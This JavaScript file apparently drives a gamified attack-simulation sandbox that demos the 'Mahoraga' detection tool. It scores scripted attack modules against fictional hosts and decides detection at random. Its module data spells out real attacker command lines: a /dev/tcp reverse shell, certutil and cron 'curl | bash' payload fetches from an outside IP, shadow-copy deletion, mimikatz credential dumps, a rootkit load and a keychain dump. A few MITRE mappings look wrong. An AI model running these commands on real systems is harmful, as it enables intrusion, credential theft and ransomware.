'use strict';

// ── Target & module definitions ────────────────────────────────────────────

const TARGETS = [
  {
    id: 'win-srv-01',
    name: 'WIN-SRV-01',
    os: 'Windows Server 2019',
    ip: '10.0.0.12',
    diff: 'medium',
    vulns: 4,
    platform: 'Windows',
  },
  {
    id: 'ubn-web-03',
    name: 'UBN-WEB-03',
    os: 'Ubuntu 22.04 LTS',
    ip: '10.0.0.31',
    diff: 'hard',
    vulns: 6,
    platform: 'Linux',
  },
  {
    id: 'mac-dev-07',
    name: 'MAC-DEV-07',
    os: 'macOS Ventura 13.4',
    ip: '10.0.0.47',
    diff: 'easy',
    vulns: 3,
    platform: 'Darwin',
  },
  {
    id: 'win-dc-01',
    name: 'WIN-DC-01',
    os: 'Windows Server 2022 DC',
    ip: '10.0.0.5',
    diff: 'expert',
    vulns: 8,
    platform: 'Windows',
  },
];

const MODULES_BY_TARGET = {
  'win-srv-01': [
    {
      id: 'ps-enc',
      title: 'PowerShell Encoded Payload',
      desc: 'Drop a base64-encoded PowerShell stager via WMI.',
      badge: 'exploit', pts: 120,
      termSteps: [
        ['dim',    'Establishing WMI connection to 10.0.0.12...'],
        ['bright', 'wmic /node:10.0.0.12 process call create "powershell -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA..."'],
        ['yellow', '[*] WMI exec returned PID 7741'],
        ['dim',    'Monitoring process spawn...'],
        ['green',  '[+] Stager running — awaiting C2 callback'],
      ],
      detection: { event: 'powershell_encoded', attack_hint: 'backdoor', severity_hint: 8, name: 'powershell.exe',
        cmdline: ['powershell.exe','-WindowStyle','Hidden','-EncodedCommand','JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA='],
        pid: 7741, platform: 'Windows' },
    },
    {
      id: 'shadow-del',
      title: 'Shadow Copy Deletion',
      desc: 'Wipe VSS snapshots before deploying ransomware payload.',
      badge: 'exploit', pts: 180,
      termSteps: [
        ['dim',    'Uploading vssadmin wrapper via SMB share...'],
        ['bright', 'vssadmin delete shadows /all /quiet'],
        ['yellow', '[*] Deleting shadow copies...'],
        ['green',  '[+] 3 shadow copies removed — backup recovery disabled'],
      ],
      detection: { event: 'shadow_copy_deletion', attack_hint: 'ransomware', severity_hint: 10,
        name: 'vssadmin.exe', cmdline: ['vssadmin','delete','shadows','/all','/quiet'],
        pid: 3310, platform: 'Windows' },
    },
    {
      id: 'certutil-dl',
      title: 'Certutil LOLBin Download',
      desc: 'Abuse certutil.exe to download a remote payload.',
      badge: 'persist', pts: 90,
      termSteps: [
        ['dim',    'Identifying certutil.exe path...'],
        ['bright', 'certutil.exe -urlcache -split -f http://185.220.101.47/p.exe C:\\Windows\\Temp\\svchost32.exe'],
        ['yellow', '[*] Downloading payload (48 KB)...'],
        ['green',  '[+] Payload written to C:\\Windows\\Temp\\svchost32.exe'],
      ],
      detection: { event: 'lolbin_download', attack_hint: 'backdoor', severity_hint: 8,
        name: 'certutil.exe', cmdline: ['certutil.exe','-urlcache','-split','-f','http://185.220.101.47/p.exe'],
        pid: 5530, platform: 'Windows' },
    },
    {
      id: 'mimikatz',
      title: 'LSASS Credential Dump',
      desc: 'Run mimikatz sekurlsa::logonpasswords to extract hashes.',
      badge: 'priv', pts: 220,
      termSteps: [
        ['dim',    'Uploading mimikatz binary (disguised as msdtc.exe)...'],
        ['bright', 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'],
        ['yellow', '[*] Opening LSASS handle...'],
        ['yellow', '[*] Extracting credential material...'],
        ['green',  '[+] 3 credential sets extracted — NTLM hashes available'],
      ],
      detection: { event: 'credential_dump_tool', attack_hint: 'privilege_escalation', severity_hint: 10,
        name: 'mimikatz.exe', cmdline: ['mimikatz.exe','sekurlsa::logonpasswords','exit'],
        pid: 9910, platform: 'Windows' },
    },
  ],

  'ubn-web-03': [
    {
      id: 'rev-shell',
      title: 'Bash Reverse Shell',
      desc: 'Exploit LFI to drop a /dev/tcp reverse shell.',
      badge: 'exploit', pts: 200,
      termSteps: [
        ['dim',    'Identifying LFI vector in /var/www/app/upload.php...'],
        ['bright', 'curl -s "http://10.0.0.31/upload.php?file=../../../../proc/self/environ" -H "User-Agent: <?php system(\'bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\'); ?>"'],
        ['yellow', '[*] PHP executed — opening reverse shell'],
        ['green',  '[+] Shell obtained on 10.0.0.31 — bash 5.1.16'],
      ],
      detection: { event: 'reverse_shell', attack_hint: 'c2_beacon', severity_hint: 10,
        name: 'bash', cmdline: ['bash','-i','>& /dev/tcp/10.0.0.99/4444','0>&1'],
        pid: 1882, platform: 'Linux' },
    },
    {
      id: 'ld-preload',
      title: 'LD_PRELOAD Injection',
      desc: 'Inject a malicious shared library into sshd to steal credentials.',
      badge: 'priv', pts: 250,
      termSteps: [
        ['dim',    'Compiling hook library: ssh_hook.so'],
        ['bright', 'gcc -shared -fPIC -o /tmp/ssh_hook.so hook.c -ldl'],
        ['bright', 'echo "LD_PRELOAD=/tmp/ssh_hook.so" >> /etc/environment'],
        ['yellow', '[*] Waiting for next SSH authentication...'],
        ['green',  '[+] Plaintext credential captured: root:P@ssw0rd!'],
      ],
      detection: { event: 'ld_preload_injection', attack_hint: 'rootkit', severity_hint: 10,
        name: 'sshd', cmdline: ['sshd'],
        pid: 3391, platform: 'Linux' },
    },
    {
      id: 'kernel-mod',
      title: 'Rootkit Kernel Module',
      desc: 'Load a LKM rootkit to hide the attacker\'s presence.',
      badge: 'exploit', pts: 300,
      termSteps: [
        ['dim',    'Transferring rootkit.ko to /tmp via SCP...'],
        ['bright', 'insmod /tmp/rootkit.ko'],
        ['yellow', '[*] Module loaded — hooking sys_getdents64'],
        ['yellow', '[*] Hiding PID ranges 9100–9200 from userspace'],
        ['green',  '[+] Rootkit active — attacker processes invisible'],
      ],
      detection: { event: 'kernel_module_load', attack_hint: 'rootkit', severity_hint: 9,
        name: 'insmod', cmdline: ['insmod','/tmp/rootkit.ko'],
        pid: 1001, platform: 'Linux' },
    },
    {
      id: 'cron-persist',
      title: 'Cron Persistence',
      desc: 'Write a cron entry to survive reboots.',
      badge: 'persist', pts: 100,
      termSteps: [
        ['dim',    'Writing persistence cron entry...'],
        ['bright', 'echo "*/5 * * * * curl -s http://185.220.101.47/beacon.sh | bash" | crontab -'],
        ['yellow', '[*] Cron entry installed for root'],
        ['green',  '[+] Beacon fires every 5 minutes'],
      ],
      detection: { event: 'cron_modification', attack_hint: 'backdoor', severity_hint: 7,
        name: 'crontab', cmdline: ['crontab','-e'],
        pid: 7711, platform: 'Linux' },
    },
  ],

  'mac-dev-07': [
    {
      id: 'gatekeeper',
      title: 'Gatekeeper Bypass',
      desc: 'Strip quarantine xattr to silently execute unsigned payload.',
      badge: 'exploit', pts: 140,
      termSteps: [
        ['dim',    'Payload delivered via social engineering (ZIP download)...'],
        ['bright', 'xattr -r -d com.apple.quarantine /Applications/Backdoor.app'],
        ['yellow', '[*] Quarantine attribute removed'],
        ['bright', 'open /Applications/Backdoor.app'],
        ['green',  '[+] Payload launched — Gatekeeper bypassed'],
      ],
      detection: { event: 'gatekeeper_bypass', attack_hint: 'rootkit', severity_hint: 8,
        name: 'xattr', cmdline: ['xattr','-d','com.apple.quarantine','/Applications/Backdoor.app'],
        pid: 4421, platform: 'Darwin' },
    },
    {
      id: 'launchagent',
      title: 'LaunchAgent Persistence',
      desc: 'Drop a plist into ~/Library/LaunchAgents for boot persistence.',
      badge: 'persist', pts: 160,
      termSteps: [
        ['dim',    'Writing malicious LaunchAgent plist...'],
        ['bright', 'cat > ~/Library/LaunchAgents/com.apple.security.update.plist << EOF'],
        ['dim',    '  RunAtLoad=true  Program=/tmp/.backdoor'],
        ['bright', 'launchctl load ~/Library/LaunchAgents/com.apple.security.update.plist'],
        ['green',  '[+] Agent loaded — will persist across reboots'],
      ],
      detection: { event: 'persistence_mechanism', attack_hint: 'backdoor', severity_hint: 9,
        name: 'launchctl', cmdline: ['launchctl','load','~/Library/LaunchAgents/com.apple.security.update.plist'],
        pid: 2201, platform: 'Darwin' },
    },
    {
      id: 'keychain',
      title: 'Keychain Credential Dump',
      desc: 'Extract saved passwords from the macOS keychain.',
      badge: 'exfil', pts: 190,
      termSteps: [
        ['dim',    'Accessing macOS keychain via security binary...'],
        ['bright', 'security find-generic-password -wa "GitHub"'],
        ['bright', 'security dump-keychain -d ~/Library/Keychains/login.keychain-db'],
        ['yellow', '[*] Keychain unlocked — extracting credentials'],
        ['green',  '[+] 12 passwords extracted to /tmp/.kc_dump'],
      ],
      detection: { event: 'keychain_access', attack_hint: 'keylogger', severity_hint: 9,
        name: 'security', cmdline: ['security','dump-keychain','-d'],
        pid: 6611, platform: 'Darwin' },
    },
  ],

  'win-dc-01': [
    {
      id: 'dc-dcsync',
      title: 'DCSync Attack',
      desc: 'Impersonate a domain controller to replicate password hashes.',
      badge: 'priv', pts: 350,
      termSteps: [
        ['dim',    'Checking replication privileges...'],
        ['bright', 'mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" exit'],
        ['yellow', '[*] Replication request sent to DC'],
        ['yellow', '[*] Receiving user objects (412 accounts)...'],
        ['green',  '[+] NTLM hash for krbtgt extracted — Golden Ticket possible'],
      ],
      detection: { event: 'credential_dump_tool', attack_hint: 'privilege_escalation', severity_hint: 10,
        name: 'mimikatz.exe', cmdline: ['mimikatz.exe','lsadump::dcsync','/domain:corp.local'],
        pid: 4401, platform: 'Windows' },
    },
    {
      id: 'dc-ransomware',
      title: 'Domain-wide Ransomware Deploy',
      desc: 'Push ransomware via GPO to all domain members.',
      badge: 'exploit', pts: 400,
      termSteps: [
        ['dim',    'Authenticating with stolen krbtgt hash (Golden Ticket)...'],
        ['bright', 'net use \\\\10.0.0.5\\SYSVOL /user:CORP\\Administrator'],
        ['bright', 'copy ransom.exe \\\\10.0.0.5\\SYSVOL\\corp.local\\scripts\\update.exe'],
        ['yellow', '[*] GPO modification written — propagating to all clients'],
        ['green',  '[+] Payload will execute on next group policy refresh (90 min)'],
      ],
      detection: { event: 'shadow_copy_deletion', attack_hint: 'ransomware', severity_hint: 10,
        name: 'vssadmin.exe', cmdline: ['vssadmin','delete','shadows','/all'],
        pid: 3320, platform: 'Windows' },
    },
    {
      id: 'dc-kerberoast',
      title: 'Kerberoasting',
      desc: 'Request service tickets for offline brute-force cracking.',
      badge: 'recon', pts: 200,
      termSteps: [
        ['dim',    'Enumerating SPNs in LDAP...'],
        ['bright', 'GetUserSPNs.py corp.local/user:P@ss -request'],
        ['yellow', '[*] Found 7 Kerberoastable accounts'],
        ['yellow', '[*] Requesting TGS tickets...'],
        ['green',  '[+] 7 TGS hashes saved — ready for hashcat offline crack'],
      ],
      detection: { event: 'high_risk_process', attack_hint: 'privilege_escalation', severity_hint: 7,
        name: 'python3', cmdline: ['GetUserSPNs.py','corp.local/user:P@ss','-request'],
        pid: 5502, platform: 'Windows' },
    },
  ],
};

// ── State ─────────────────────────────────────────────────────────────────

let state = {
  selectedTarget: null,
  running:        false,
  score:          0,
  caught:         0,
  evaded:         0,
  log:            [],
  completedModules: new Set(),
};

let _terminalInterval = null;
let _progressInterval = null;

// ── Init ──────────────────────────────────────────────────────────────────

function sbInit() {
  renderTargets();
  renderLog();
}

// ── Targets ───────────────────────────────────────────────────────────────

function renderTargets() {
  const el = document.getElementById('sb-target-list');
  el.innerHTML = TARGETS.map(t => `
    <div class="sb-target${state.selectedTarget === t.id ? ' selected' : ''}"
         onclick="sbSelectTarget('${t.id}')">
      <div class="sb-target-row">
        <div>
          <div class="sb-target-name">${t.name}</div>
          <div class="sb-target-os">${t.os}</div>
          <div class="sb-target-ip">${t.ip}</div>
        </div>
        <span class="sb-diff sb-diff-${t.diff}">${t.diff}</span>
      </div>
      <div class="sb-target-vuln-count"><span>${t.vulns}</span> vulnerabilities</div>
    </div>
  `).join('');
}

function sbSelectTarget(id) {
  if (state.running) return;
  state.selectedTarget = id;
  renderTargets();
  renderModules();
  const t = TARGETS.find(x => x.id === id);
  document.getElementById('sb-terminal-title').textContent = `${t.name} — ${t.ip}`;
  sbTerminalPrint([
    ['dim',    ''],
    ['dim',    '─────────────────────────────────────────'],
    ['bright', `Target: ${t.name} (${t.ip})`],
    ['dim',    `OS: ${t.os}`],
    ['dim',    `Difficulty: ${t.diff.toUpperCase()}   Vulnerabilities: ${t.vulns}`],
    ['dim',    '─────────────────────────────────────────'],
    ['dim',    'Select an attack module to begin.'],
  ]);
}

// ── Modules ───────────────────────────────────────────────────────────────

function renderModules() {
  const el = document.getElementById('sb-module-list');
  if (!state.selectedTarget) {
    el.innerHTML = '<div class="sb-module-empty">Select a target to see available attack modules.</div>';
    return;
  }
  const mods = MODULES_BY_TARGET[state.selectedTarget] || [];
  el.innerHTML = mods.map(m => {
    const done = state.completedModules.has(m.id);
    return `
      <div class="sb-module ${done ? 'done' : ''} ${state.running ? 'disabled' : ''}"
           onclick="sbLaunch('${m.id}')">
        <div class="sb-module-title">
          <span>${m.title}</span>
          <span class="sb-module-badge sb-badge-${m.badge}">${m.badge}</span>
        </div>
        <div class="sb-module-desc">${m.desc}</div>
        <div class="sb-module-pts">+${m.pts} pts</div>
        <div class="sb-module-tick">✓</div>
      </div>
    `;
  }).join('');
}

// ── Launch attack ─────────────────────────────────────────────────────────

function sbLaunch(moduleId) {
  if (state.running || !state.selectedTarget) return;
  const m = MODULES_BY_TARGET[state.selectedTarget].find(x => x.id === moduleId);
  if (!m) return;

  state.running = true;
  renderModules();

  // Show progress bar
  const progressEl = document.getElementById('sb-attack-progress');
  const progressFill = document.getElementById('sb-progress-fill');
  const progressPct  = document.getElementById('sb-progress-pct');
  const progressText = document.getElementById('sb-progress-text');

  progressEl.style.display = 'block';
  progressText.textContent = m.title + '...';
  progressFill.style.width = '0%';
  progressPct.textContent  = '0%';

  // Live dot
  const liveDot = document.getElementById('sb-live-dot');
  liveDot.style.opacity = '1';

  // Print opening line
  sbTerminalPrint([
    ['dim', ''],
    ['red', `❯ Launching: ${m.title}`],
  ]);

  // Animate terminal steps
  let stepIdx = 0;
  const stepDelay = 900;

  const totalDuration = (m.termSteps.length + 1) * stepDelay;
  let elapsed = 0;

  _progressInterval = setInterval(() => {
    elapsed += 100;
    const pct = Math.min(Math.round((elapsed / totalDuration) * 100), 99);
    progressFill.style.width = pct + '%';
    progressPct.textContent  = pct + '%';
  }, 100);

  function runNextStep() {
    if (stepIdx >= m.termSteps.length) {
      clearInterval(_progressInterval);
      progressFill.style.width = '100%';
      progressPct.textContent  = '100%';
      setTimeout(() => finishAttack(m), 500);
      return;
    }
    sbTerminalPrint([m.termSteps[stepIdx]]);
    stepIdx++;
    setTimeout(runNextStep, stepDelay + Math.random() * 200);
  }

  setTimeout(runNextStep, 400);
}

function finishAttack(m) {
  // Determine if Mahoraga catches it (weighted by severity)
  const sev = m.detection.severity_hint || 5;
  const catchChance = 0.4 + (sev / 10) * 0.55; // severity 10 → 95% catch rate
  const caught = Math.random() < catchChance;

  // Add detection event to feed
  sbAddDetectionEvent(m, caught);

  // Show result modal
  const pts = caught ? Math.round(m.pts * 0.3) : m.pts;
  showResultModal(m, caught, pts);

  // Update score
  state.score += pts;
  if (caught) state.caught++; else state.evaded++;
  state.completedModules.add(m.id);

  document.getElementById('sb-score').textContent = state.score;
  document.getElementById('sb-caught').textContent = state.caught;
  document.getElementById('sb-evaded').textContent = state.evaded;

  // Log entry
  state.log.unshift({ name: m.title, caught, pts });
  renderLog();

  // Hide progress
  document.getElementById('sb-attack-progress').style.display = 'none';
  document.getElementById('sb-live-dot').style.opacity = caught ? '1' : '0.3';

  state.running = false;
  renderModules();
}

// ── Terminal ──────────────────────────────────────────────────────────────

function sbTerminalPrint(lines) {
  const body = document.getElementById('sb-terminal-body');
  lines.forEach(([cls, text]) => {
    const div = document.createElement('div');
    div.className = cls === 'dim'    ? 'sb-t-dim'    :
                    cls === 'bright' ? 'sb-t-bright sb-t-prompt' :
                    cls === 'green'  ? 'sb-t-green'  :
                    cls === 'yellow' ? 'sb-t-yellow'  :
                    cls === 'blue'   ? 'sb-t-blue'    :
                    cls === 'red'    ? 'sb-t-red'     : 'sb-t-muted';
    div.textContent = text;
    body.appendChild(div);
  });
  body.scrollTop = body.scrollHeight;
}

// ── Detection feed ────────────────────────────────────────────────────────

function sbAddDetectionEvent(m, caught) {
  const body = document.getElementById('sb-detect-body');
  const empty = document.getElementById('sb-detect-empty');
  if (empty) empty.style.display = 'none';

  const ev = document.createElement('div');
  ev.className = `sb-detect-event ${caught ? 'caught' : 'evaded'}`;
  ev.innerHTML = `
    <div class="sb-de-top">
      <span class="sb-de-event">${m.detection.event}</span>
      <span class="sb-de-verdict ${caught ? 'caught' : 'evaded'}">${caught ? 'DETECTED' : 'EVADED'}</span>
    </div>
    <div class="sb-de-detail">
      sev=${m.detection.severity_hint} · ${m.detection.name} · ${m.detection.platform}
    </div>
  `;
  body.insertBefore(ev, body.firstChild);
}

// ── Result modal ──────────────────────────────────────────────────────────

function showResultModal(m, caught, pts) {
  const top     = document.getElementById('sb-result-top');
  const icon    = document.getElementById('sb-result-icon');
  const verdict = document.getElementById('sb-result-verdict');
  const sub     = document.getElementById('sb-result-sub');
  const rows    = document.getElementById('sb-result-rows');

  top.className = 'sb-result-top ' + (caught ? 'detected' : 'evaded');
  icon.textContent    = caught ? '🛡' : '💀';
  verdict.textContent = caught ? 'Detected' : 'Evaded';
  sub.textContent     = caught
    ? 'Mahoraga neutralised the attack before it completed.'
    : 'Attack succeeded — Mahoraga missed this one. It\'s adapting now.';

  rows.innerHTML = `
    <div class="sb-result-row"><span class="lbl">Attack</span><span class="val">${m.title}</span></div>
    <div class="sb-result-row"><span class="lbl">Detection event</span><span class="val mono">${m.detection.event}</span></div>
    <div class="sb-result-row"><span class="lbl">Severity</span><span class="val">${m.detection.severity_hint}/10</span></div>
    <div class="sb-result-row"><span class="lbl">MITRE technique</span><span class="val mono">${getMitre(m.detection.event)}</span></div>
    <div class="sb-result-row"><span class="lbl">Points awarded</span><span class="val" style="color:var(--red)">+${pts}</span></div>
  `;

  document.getElementById('sb-result-modal').style.display = 'flex';
}

function sbCloseModal(e) {
  if (e && e.target !== document.getElementById('sb-result-modal')) return;
  document.getElementById('sb-result-modal').style.display = 'none';
}

function sbNextAttack() {
  // Scroll module list into view
  document.getElementById('sb-module-list').scrollIntoView({ behavior: 'smooth' });
}

// ── Session log ───────────────────────────────────────────────────────────

function renderLog() {
  const el = document.getElementById('sb-log');
  if (state.log.length === 0) {
    el.innerHTML = '<div class="sb-log-empty">No completed attacks yet.</div>';
    return;
  }
  el.innerHTML = state.log.slice(0, 10).map(e => `
    <div class="sb-log-row">
      <span class="sb-log-name">${e.name}</span>
      <div class="sb-log-right">
        <span class="sb-log-result ${e.caught ? 'caught' : 'evaded'}">${e.caught ? 'detected' : 'evaded'}</span>
        <span class="sb-log-pts">+${e.pts}</span>
      </div>
    </div>
  `).join('');
}

// ── Reset ─────────────────────────────────────────────────────────────────

function sbReset() {
  if (state.running) return;
  state = {
    selectedTarget: null, running: false,
    score: 0, caught: 0, evaded: 0,
    log: [], completedModules: new Set(),
  };
  document.getElementById('sb-score').textContent  = '0';
  document.getElementById('sb-caught').textContent = '0';
  document.getElementById('sb-evaded').textContent = '0';
  document.getElementById('sb-detect-body').innerHTML =
    '<div class="sb-detect-empty" id="sb-detect-empty">No attacks launched yet.<br>Detection events will appear here.</div>';
  document.getElementById('sb-terminal-body').innerHTML = `
    <div class="sb-terminal-welcome">
      <span class="sb-t-red">mahoraga</span><span class="sb-t-dim">@sandbox</span><span class="sb-t-dim">:~$</span>
      <span class="sb-t-muted"> Session reset.</span><br><br>
    </div>`;
  document.getElementById('sb-live-dot').style.opacity = '0.3';
  document.getElementById('sb-terminal-title').textContent = 'mahoraga-sandbox — bash';
  document.getElementById('sb-attack-progress').style.display = 'none';
  renderTargets();
  renderModules();
  renderLog();
}

// ── MITRE lookup ──────────────────────────────────────────────────────────

function getMitre(event) {
  const map = {
    powershell_encoded:     'T1059.001',
    shadow_copy_deletion:   'T1490',
    lolbin_download:        'T1218.002',
    credential_dump_tool:   'T1003.001',
    reverse_shell:          'T1059.004',
    ld_preload_injection:   'T1574.006',
    kernel_module_load:     'T1547.006',
    cron_modification:      'T1053.003',
    gatekeeper_bypass:      'T1553.001',
    persistence_mechanism:  'T1543.001',
    keychain_access:        'T1555.001',
    high_risk_process:      'T1059',
  };
  return map[event] || 'T1059';
}

// ── Boot ──────────────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', sbInit);
